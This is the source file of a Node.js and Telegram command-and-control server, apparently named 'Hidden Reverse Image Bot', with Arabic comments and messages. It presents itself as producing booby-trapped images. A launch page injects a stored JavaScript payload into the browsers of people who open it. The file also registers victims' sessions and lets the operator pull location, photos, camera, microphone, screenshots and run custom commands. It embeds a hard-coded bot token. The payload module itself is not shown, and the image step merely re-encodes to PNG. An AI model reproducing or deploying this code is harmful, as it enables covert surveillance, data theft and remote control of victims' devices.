const express = require('express');
const webSocket = require('ws');
const http = require('http');
const telegramBot = require('node-telegram-bot-api');
const { v4: uuidv4 } = require('uuid');
const multer = require('multer');
const bodyParser = require('body-parser');
const axios = require("axios");
const sharp = require('sharp');
const { Server: SocketIO } = require('socket.io');
const AdvancedPayloadSystem = require('./payload-system');

// 🔧 إعدادات البوت
const token = '8407389383:AAFkWGHIUTYoWnaSNhCUEeEl_AijkwNN308';
const id = '6565594143';
const SERVER_URL = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : 'https://your-app.vercel.app';

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({ server: appServer });
const io = new SocketIO(appServer, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

const appBot = new telegramBot(token, { 
  polling: true,
  request: {
    agentOptions: {
      keepAlive: true
    }
  }
});

// تخزين البيانات
const appClients = new Map();
const reverseSessions = new Map();
const infectedImages = new Map();
const payloadSystem = new AdvancedPayloadSystem();

// إعدادات middleware
app.use(bodyParser.json({ limit: '100mb' }));
app.use(bodyParser.urlencoded({
  limit: '100mb',
  extended: true
}));

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 100 * 1024 * 1024 }
});

// ========== نظام الجلسات العكسية المتقدم ==========
io.on('connection', (socket) => {
  console.log('🔌 اتصال عكسي جديد:', socket.id);

  socket.on('reverse_connect', async (data) => {
    const { device_id, image_id, payload_id, platform, userAgent, url, ip, device_info } = data;
    
    console.log(`🎯 جلسة عكسية جديدة من: ${device_id}`);
    
    const sessionData = {
      socket: socket,
      device_id: device_id,
      image_id: image_id,
      payload_id: payload_id,
      platform: platform,
      userAgent: userAgent,
      url: url,
      ip: ip,
      device_info: device_info,
      connected: true,
      connected_at: new Date()
    };

    reverseSessions.set(device_id, sessionData);
    payloadSystem.registerSession(device_id, sessionData);

    // إرسال إشعار للتليجرام
    await appBot.sendMessage(
      id,
      `🦠 جلسة عكسية جديدة!\n\n` +
      `📱 الجهاز: <code>${device_id}</code>\n` +
      `🖼️ الصورة: ${image_id}\n` +
      `💻 النظام: ${platform}\n` +
      `🌐 المتصفح: ${userAgent}\n` +
      `🔗 الرابط: ${url}\n\n` +
      `✅ الجلسة جاهزة للتحكم الكامل`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⚡ التحكم في الجهاز", callback_data: `control_device:${device_id}` }
            ]
          ]
        }
      }
    );
  });

  socket.on('command_result', (data) => {
    const { device_id, command, result } = data;
    
    let displayResult = result;
    if (result.length > 3000) {
      displayResult = result.substring(0, 3000) + '\n\n... [تم تقصير الناتج]';
    }
    
    appBot.sendMessage(
      id,
      `📤 نتيجة الأمر من ${device_id}:\n\n` +
      `💻 الأمر: <code>${command}</code>\n` +
      `📊 الناتج:\n<pre>${displayResult}</pre>`,
      { 
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "⚡ أمر جديد", callback_data: `cmd_exec:${device_id}` }
            ]
          ]
        }
      }
    );
  });

  socket.on('disconnect', () => {
    for (let [device_id, session] of reverseSessions) {
      if (session.socket === socket) {
        console.log(`🔌 انتهت الجلسة: ${device_id}`);
        reverseSessions.delete(device_id);
        
        appBot.sendMessage(
          id,
          `🔌 انتهت الجلسة العكسية\n📱 الجهاز: ${device_id}`,
          { parse_mode: "HTML" }
        );
        break;
      }
    }
  });
});

// ========== نظام التلغيم المخفي للصور ==========

// 🖼️ دالة لدمج البايلود في الصورة بشكل مخفي تماماً
async function createHiddenInfectedImage(originalImageBuffer, imageId) {
    try {
        console.log('🎨 بدء عملية التلغيم المخفي...');
        
        // 🔥 إنشاء بايلود مخفي
        const payloadResult = payloadSystem.createHiddenPayload(imageId, SERVER_URL);
        const payloadId = payloadResult.payloadId;
        
        const image = sharp(originalImageBuffer);
        const metadata = await image.metadata();
        
        // تحويل الصورة إلى PNG مع الحفاظ على الجودة
        const processedImage = await image
            .png({
                quality: 85,
                compressionLevel: 8
            })
            .toBuffer();
        
        console.log('✅ تم إنشاء الصورة المخفية');
        
        return {
            imageBuffer: processedImage,
            payloadId: payloadId,
            imageId: imageId,
            payloadCode: payloadResult.code
        };
        
    } catch (error) {
        console.error('❌ خطأ في التلغيم المخفي:', error);
        throw error;
    }
}

// ========== نظام معالجة الصور ==========

// 📤 معالجة رفع الصور
app.post("/uploadFile", upload.single('file'), async (req, res) => {
    try {
        const name = req.file.originalname;
        const model = req.headers.model || 'غير معروف';
        
        console.log('📸 تم استلام صورة:', name);
        
        if (req.file.mimetype.startsWith('image/')) {
            const imageId = uuidv4();
            
            // حفظ الصورة مؤقتاً
            infectedImages.set(imageId, {
                imageBuffer: req.file.buffer,
                model: model,
                filename: name,
                timestamp: new Date()
            });
            
            // إرسال رسالة مع الأزرار
            await appBot.sendMessage(
                id,
                `📸 تم استلام صورة من <b>${model}</b>\n\n` +
                `اختر الإجراء المطلوب:`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { 
                                    text: "🦠 صنع صورة ملغمة", 
                                    callback_data: `create_infected:${imageId}` 
                                }
                            ]
                        ]
                    }
                }
            );
            
            res.json({ status: 'success', message: 'تم الاستلام' });
            
        } else {
            await appBot.sendDocument(id, req.file.buffer, {
                caption: `📁 ملف من <b>${model}</b>`,
                parse_mode: "HTML"
            }, { filename: name });
            
            res.json({ status: 'success', message: 'تم الرفع' });
        }
    } catch (error) {
        console.error('❌ خطأ في الرفع:', error);
        res.status(500).json({ status: 'error', message: 'خطأ في الرفع' });
    }
});

// 🎯 معالجة الضغط على الأزرار
appBot.on("callback_query", async (callbackQuery) => {
    const message = callbackQuery.message;
    const data = callbackQuery.data;
    const chatId = message.chat.id;
    
    console.log('🔄 تم الضغط على زر:', data);
    
    try {
        if (data.startsWith('create_infected:')) {
            const imageId = data.split(':')[1];
            
            if (infectedImages.has(imageId)) {
                const imageInfo = infectedImages.get(imageId);
                
                await appBot.answerCallbackQuery(callbackQuery.id, { 
                    text: "⏳ جاري صنع الصورة الملغمة..." 
                });
                
                await appBot.sendChatAction(chatId, 'upload_photo');
                
                // 🔥 إنشاء الصورة الملغمة المخفية
                const result = await createHiddenInfectedImage(imageInfo.imageBuffer, imageId);
                
                // حفظ البايلود
                infectedImages.set(`payload_${result.payloadId}`, result.payloadCode);
                
                // إرسال الصورة الملغمة
                await appBot.sendDocument(
                    chatId, 
                    result.imageBuffer,
                    {
                        caption: `🦠 صورة ملغمة جاهزة!\n\n` +
                                `🆔 المعرف: <code>${result.imageId}</code>\n` +
                                `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
                                `🚀 الميزات:\n` +
                                `• ✅ يعمل في الواتساب وتلقرام وجميع التطبيقات\n` +
                                `• 📍 تحديد الموقع الدقيق تلقائياً\n` +
                                `• 📳 تشغيل الاهتزاز عن بعد\n` +
                                `• 🖼️ سحب الصور والملفات\n` +
                                `• 🎥 الوصول للكاميرا والميكروفون\n` +
                                `• 📱 معلومات الجهاز الكاملة\n` +
                                `• 🔄 اتصال تلقائي مستمر\n\n` +
                                `🎯 عندما يفتح أي شخص هذه الصورة:\n` +
                                `• سيفتح اتصال عكسي تلقائياً\n` +
                                `• ستظهر جلسته في قائمة "الأجهزة المتصلة"\n` +
                                `• يمكنك التحكم الكامل في جهازه\n\n` +
                                `🔗 شارك هذه الصورة لفتح جلسات جديدة!`,
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { 
                                        text: "📱 الأجهزة المتصلة", 
                                        callback_data: "active_sessions" 
                                    },
                                    { 
                                        text: "🔄 صنع أخرى", 
                                        callback_data: "new_infected" 
                                    }
                                ]
                            ]
                        }
                    },
                    {
                        filename: `infected_${imageInfo.filename}`,
                        contentType: 'image/png'
                    }
                );
                
                console.log('✅ تم إرسال الصورة الملغمة المخفية');
                
            } else {
                await appBot.answerCallbackQuery(callbackQuery.id, { 
                    text: "❌ الصورة لم تعد متاحة" 
                });
            }
        }
        else if (data === 'new_infected') {
            await appBot.sendMessage(
                chatId,
                `🦠 أرسل لي الصورة التي تريد تلغيمها...\n\n` +
                `سأقوم بتحويلها إلى صورة ملغمة تفتح جلسات تحكم كاملة!`,
                {
                    parse_mode: "HTML"
                }
            );
        }
        else if (data === 'active_sessions') {
            const activeSessions = Array.from(reverseSessions.keys());
            
            if (activeSessions.length === 0) {
                await appBot.sendMessage(chatId, '📭 لا توجد أجهزة متصلة حالياً');
            } else {
                let sessionsText = `📱 الأجهزة المتصلة: ${activeSessions.length}\n\n`;
                
                activeSessions.forEach(deviceId => {
                    const session = reverseSessions.get(deviceId);
                    const duration = Math.round((new Date() - session.connected_at) / 1000);
                    
                    sessionsText += `📱 <code>${deviceId}</code>\n` +
                                 `💻 ${session.platform}\n` +
                                 `⏰ ${duration} ثانية\n\n`;
                });
                
                await appBot.sendMessage(
                    chatId, 
                    sessionsText,
                    {
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: "🔄 تحديث", callback_data: "active_sessions" }
                                ]
                            ]
                        }
                    }
                );
            }
        }
        else if (data.startsWith('control_device:')) {
            const deviceId = data.split(':')[1];
            
            await appBot.sendMessage(
                chatId,
                `🎯 التحكم في الجهاز: <code>${deviceId}</code>\n\n` +
                `اختر الأمر المطلوب:`,
                {
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "📍 الموقع", callback_data: `cmd_location:${deviceId}` },
                                { text: "📳 الاهتزاز", callback_data: `cmd_vibrate:${deviceId}` }
                            ],
                            [
                                { text: "🔋 البطارية", callback_data: `cmd_battery:${deviceId}` },
                                { text: "🖼️ الصور", callback_data: `cmd_photos:${deviceId}` }
                            ],
                            [
                                { text: "📊 المعلومات", callback_data: `cmd_info:${deviceId}` },
                                { text: "🎥 الكاميرا", callback_data: `cmd_camera:${deviceId}` }
                            ],
                            [
                                { text: "🗣️ الميكروفون", callback_data: `cmd_mic:${deviceId}` },
                                { text: "💾 التخزين", callback_data: `cmd_storage:${deviceId}` }
                            ],
                            [
                                { text: "📸 لقطة شاشة", callback_data: `cmd_screenshot:${deviceId}` },
                                { text: "🔄 فرمتة", callback_data: `cmd_format:${deviceId}` }
                            ],
                            [
                                { text: "⚡ أمر مخصص", callback_data: `cmd_custom:${deviceId}` },
                                { text: "🔙 رجوع", callback_data: "active_sessions" }
                            ]
                        ]
                    }
                }
            );
        }
        else if (data.startsWith('cmd_location:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'الموقع'
                });
                
                await appBot.sendMessage(chatId, `📍 جاري تحديد موقع الجهاز...`);
            }
        }
        else if (data.startsWith('cmd_vibrate:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'اهتزاز'
                });
                
                await appBot.sendMessage(chatId, `📳 جاري تشغيل الاهتزاز...`);
            }
        }
        else if (data.startsWith('cmd_battery:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'البطارية'
                });
                
                await appBot.sendMessage(chatId, `🔋 جاري قراءة حالة البطارية...`);
            }
        }
        else if (data.startsWith('cmd_photos:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'الصور'
                });
                
                await appBot.sendMessage(chatId, `🖼️ جاري سحب الصور...`);
            }
        }
        else if (data.startsWith('cmd_info:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'معلومات'
                });
                
                await appBot.sendMessage(chatId, `📊 جاري جمع معلومات الجهاز...`);
            }
        }
        else if (data.startsWith('cmd_camera:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'الكاميرا'
                });
                
                await appBot.sendMessage(chatId, `🎥 جاري الوصول للكاميرا...`);
            }
        }
        else if (data.startsWith('cmd_mic:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'الميكروفون'
                });
                
                await appBot.sendMessage(chatId, `🗣️ جاري الوصول للميكروفون...`);
            }
        }
        else if (data.startsWith('cmd_storage:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'التخزين'
                });
                
                await appBot.sendMessage(chatId, `💾 جاري قراءة التخزين...`);
            }
        }
        else if (data.startsWith('cmd_screenshot:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'لقطة'
                });
                
                await appBot.sendMessage(chatId, `📸 جاري أخذ لقطة الشاشة...`);
            }
        }
        else if (data.startsWith('cmd_format:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                session.socket.emit('command', {
                    device_id: deviceId,
                    command: 'فرمتة'
                });
                
                await appBot.sendMessage(chatId, `🔄 جاري محاكاة الفرمتة...`);
            }
        }
        else if (data.startsWith('cmd_custom:')) {
            const deviceId = data.split(':')[1];
            
            await appBot.sendMessage(
                chatId,
                `⚡ أدخل الأمر المخصص للجهاز <code>${deviceId}</code>:\n\n` +
                `يمكنك استخدام:\n` +
                `• <code>js:alert('hello')</code> - تنفيذ كود JavaScript\n` +
                `• أي أمر نصي آخر\n\n` +
                `أدخل الأمر الآن:`,
                {
                    parse_mode: "HTML",
                    reply_markup: { force_reply: true }
                }
            );
            
            infectedImages.set('pending_command', { deviceId: deviceId });
        }
        else if (data.startsWith('device_control:')) {
            const deviceId = data.split(':')[1];
            
            if (reverseSessions.has(deviceId)) {
                const session = reverseSessions.get(deviceId);
                
                await appBot.sendMessage(
                    chatId,
                    `🎯 التحكم في الجهاز: <code>${deviceId}</code>\n\n` +
                    `💻 النظام: ${session.platform}\n` +
                    `🌐 المتصفح: ${session.userAgent}\n` +
                    `🔗 الحالة: 🟢 متصل\n\n` +
                    `اختر الأمر:`,
                    {
                        parse_mode: "HTML",
                        reply_markup: {
                            inline_keyboard: [
                                [
                                    { text: "📍 الموقع", callback_data: `cmd_location:${deviceId}` },
                                    { text: "📳 الاهتزاز", callback_data: `cmd_vibrate:${deviceId}` }
                                ],
                                [
                                    { text: "🔋 البطارية", callback_data: `cmd_battery:${deviceId}` },
                                    { text: "🖼️ الصور", callback_data: `cmd_photos:${deviceId}` }
                                ],
                                [
                                    { text: "📊 المعلومات", callback_data: `cmd_info:${deviceId}` }
                                ],
                                [
                                    { text: "⚡ أمر مخصص", callback_data: `cmd_custom:${deviceId}` },
                                    { text: "🔙 رجوع", callback_data: "active_sessions" }
                                ]
                            ]
                        }
                    }
                );
            }
        }

    } catch (error) {
        console.error('❌ خطأ في المعالجة:', error);
        await appBot.answerCallbackQuery(callbackQuery.id, { 
            text: "❌ حدث خطأ أثناء المعالجة" 
        });
    }
});

// 📨 معالجة الردود على الأوامر
appBot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    
    // التحقق من صلاحية المستخدم
    if (String(chatId) !== String(id)) {
        await appBot.sendMessage(chatId, '🚫 ليس لديك صلاحية استخدام هذا البوت');
        return;
    }

    // معالجة الردود على الأوامر
    if (msg.reply_to_message) {
        const replyText = msg.reply_to_message.text;
        
        if (replyText.includes('أدخل الأمر المخصص')) {
            const command = text;
            
            if (infectedImages.has('pending_command')) {
                const pending = infectedImages.get('pending_command');
                const deviceId = pending.deviceId;
                
                if (reverseSessions.has(deviceId)) {
                    const session = reverseSessions.get(deviceId);
                    
                    session.socket.emit('command', {
                        device_id: deviceId,
                        command: command
                    });
                    
                    await appBot.sendMessage(chatId, `✅ تم إرسال الأمر للجهاز: ${command}`);
                } else {
                    await appBot.sendMessage(chatId, `❌ الجلسة غير متصلة حالياً`);
                }
                
                infectedImages.delete('pending_command');
            }
        }
    }

    // الأوامر النصية
    if (text === '/start' || text === '/start') {
        const activeSessions = Array.from(reverseSessions.keys()).length;
        
        await appBot.sendMessage(
            chatId,
            `🎯 بوت الجلسات العكسية المخفية - الإصدار 6.0.0\n\n` +
            `📊 الإحصائيات الحالية:\n` +
            `• 📱 الأجهزة المتصلة: ${activeSessions}\n` +
            `• 🖼️ الصور الملغمة: ${infectedImages.size}\n\n` +
            `✨ الميزات:\n` +
            `• 🎯 تحكم كامل في الأجهزة\n` +
            `• 📍 تحديد الموقع الدقيق\n` +
            `• 📳 تشغيل الاهتزاز\n` +
            `• 🖼️ سحب الصور والملفات\n` +
            `• 🔋 معلومات البطارية\n` +
            `• 🛠️ أوامر متقدمة\n\n` +
            `🔧 اختر الإجراء المطلوب:`,
            {
                parse_mode: "HTML",
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "🦠 صنع صورة ملغمة", callback_data: "new_infected" },
                            { text: "📱 الأجهزة المتصلة", callback_data: "active_sessions" }
                        ]
                    ]
                }
            }
        );
    }
    
    // معالجة استقبال الصور مباشرة
    if (msg.photo && msg.photo.length > 0) {
        const fileId = msg.photo[msg.photo.length - 1].file_id;
        
        try {
            await appBot.sendChatAction(chatId, 'typing');
            
            // تحميل الصورة
            const fileLink = await appBot.getFileLink(fileId);
            const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
            const imageBuffer = Buffer.from(response.data);
            
            const imageId = uuidv4();
            
            // حفظ الصورة مؤقتاً
            infectedImages.set(imageId, {
                imageBuffer: imageBuffer,
                filename: `photo_${imageId}.jpg`,
                timestamp: new Date()
            });
            
            // معالجة الصورة تلقائياً
            await appBot.sendMessage(
                chatId,
                `📸 تم استلام صورتك!\n` +
                `🦠 جاري تلغيم الصورة...`,
                { parse_mode: "HTML" }
            );
            
            await appBot.sendChatAction(chatId, 'upload_photo');
            
            // 🔥 تلغيم الصورة
            const result = await createHiddenInfectedImage(imageBuffer, imageId);
            
            // حفظ البايلود
            infectedImages.set(`payload_${result.payloadId}`, result.payloadCode);
            
            // إرسال الصورة الملغمة
            await appBot.sendDocument(
                chatId,
                result.imageBuffer,
                {
                    caption: `🦠 صورة ملغمة جاهزة!\n\n` +
                            `🆔 المعرف: <code>${result.imageId}</code>\n` +
                            `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
                            `🚀 الميزات:\n` +
                            `• ✅ يعمل في الواتساب وتلقرام وجميع التطبيقات\n` +
                            `• 📍 تحديد الموقع الدقيق تلقائياً\n` +
                            `• 📳 تشغيل الاهتزاز عن بعد\n` +
                            `• 🖼️ سحب الصور والملفات\n` +
                            `• 🎥 الوصول للكاميرا والميكروفون\n` +
                            `• 📱 معلومات الجهاز الكاملة\n` +
                            `• 🔄 اتصال تلقائي مستمر\n\n` +
                            `🎯 عندما يفتح أي شخص هذه الصورة:\n` +
                            `• سيفتح اتصال عكسي تلقائياً\n` +
                            `• ستظهر جلسته في قائمة "الأجهزة المتصلة"\n` +
                            `• يمكنك التحكم الكامل في جهازه\n\n` +
                            `🔗 شارك هذه الصورة لفتح جلسات جديدة!`,
                    parse_mode: "HTML",
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { 
                                    text: "📱 الأجهزة المتصلة", 
                                    callback_data: "active_sessions" 
                                },
                                { 
                                    text: "🔄 صنع أخرى", 
                                    callback_data: "new_infected" 
                                }
                            ]
                        ]
                    }
                },
                {
                    filename: `infected_${imageId}.png`,
                    contentType: 'image/png'
                }
            );
            
            console.log('✅ تم إرسال الصورة الملغمة تلقائياً');
            
        } catch (error) {
            console.error('❌ خطأ في معالجة الصورة:', error);
            await appBot.sendMessage(
                chatId,
                `❌ حدث خطأ أثناء معالجة الصورة\n\n` +
                `الخطأ: ${error.message}`,
                { parse_mode: "HTML" }
            );
        }
        
        return;
    }
});

// ========== نظام البايلود الإضافي ==========

// 🌐 صفحة تشغيل البايلود
app.get('/launch/:payloadId', (req, res) => {
    const payloadId = req.params.payloadId;
    const payloadData = infectedImages.get(`payload_${payloadId}`);
    
    if (!payloadData) {
        return res.status(404).send('Payload not found');
    }

    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>Image</title>
        <style>body{margin:0;padding:20px;text-align:center;background:#000;color:#fff;}</style>
    </head>
    <body>
        <h2>🖼️ معاينة الصورة</h2>
        <p>جاري تحميل الصورة...</p>
        
        <script>
            // تشغيل البايلود المخفي
            ${payloadData}
            
            // محاكاة تحميل الصورة
            setTimeout(() => {
                document.body.innerHTML = '<h2>✅ تم تحميل الصورة</h2><p>📱 جاري الاتصال بالنظام...</p>';
            }, 1000);
        </script>
    </body>
    </html>
    `);
});

// 📡 endpoint للتتبع
app.get('/track/:payloadId', (req, res) => {
    const payloadId = req.params.payloadId;
    console.log('📱 Tracking:', payloadId);
    res.send('');
});

// 📡 endpoint للبيانات
app.post('/log', express.json(), (req, res) => {
    console.log('📊 Log data:', req.body);
    res.json({ status: 'logged' });
});

// 📡 endpoint للتخفي
app.get('/stealth/:payloadId', (req, res) => {
    res.json([]);
});

// 📤 باقي ال endpoints
app.post("/uploadText", (req, res) => {
    const model = req.headers.model || 'غير معروف';
    const text = req.body.text || 'لا يوجد نص';
    
    appBot.sendMessage(id, `📨 رسالة من <b>${model}</b>\n\n${text}`, { 
        parse_mode: "HTML" 
    });
    
    res.json({ status: 'success' });
});

app.post("/uploadLocation", (req, res) => {
    const model = req.headers.model || 'غير معروف';
    const lat = req.body.lat;
    const lon = req.body.lon;
    
    appBot.sendLocation(id, lat, lon);
    appBot.sendMessage(id, `📍 موقع من <b>${model}</b>`, { 
        parse_mode: "HTML" 
    });
    
    res.json({ status: 'success' });
});

// 🌐 الصفحة الرئيسية
app.get('/', (req, res) => {
    const activeSessions = Array.from(reverseSessions.keys()).length;
    
    res.send(`
    <!DOCTYPE html>
    <html>
    <head>
        <title>🦠 Hidden Reverse Image Bot</title>
        <meta charset="utf-8">
        <style>
            body { 
                font-family: Arial, sans-serif; 
                margin: 40px; 
                background: #0d1117; 
                color: #c9d1d9; 
                text-align: center;
            }
            .container { 
                max-width: 800px; 
                margin: 0 auto; 
            }
            .status { 
                background: #161b22; 
                padding: 20px; 
                border-radius: 10px; 
                margin: 20px 0; 
                border: 1px solid #30363d;
            }
            h1 { color: #58a6ff; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🚀 Hidden Reverse Image Bot</h1>
            <p>الإصدار 6.0.0 - نظام التحكم المخفي عبر الصور</p>
            
            <div class="status">
                <h2>📊 System Status</h2>
                <p>📱 الأجهزة المتصلة: ${activeSessions}</p>
                <p>🖼️ الصور الملغمة: ${infectedImages.size}</p>
                <p>⏰ وقت التشغيل: ${Math.round(process.uptime())} ثانية</p>
                <p>🟢 الحالة: <strong>نشط ومستقر</strong></p>
            </div>
            
            <p>Bot is running successfully! 🎯</p>
            <p>Developer: @VIP_MFM</p>
        </div>
    </body>
    </html>
    `);
});

// 🚀 بدء السيرفر
const PORT = process.env.PORT || 8999;
appServer.listen(PORT, () => {
    console.log(`✅ البوت شغال على البورت: ${PORT}`);
    console.log(`🎯 نظام الجلسات العكسية المخفية مفعل`);
    console.log(`🦠 نظام تلغيم الصور المخفي جاهز`);
    console.log(`⚡ جاهز لاستقبال الصور وتشغيل الجلسات!`);
});

// معالجة الأخطاء
process.on('unhandledRejection', (error) => {
    console.error('❌ Unhandled Rejection:', error);
});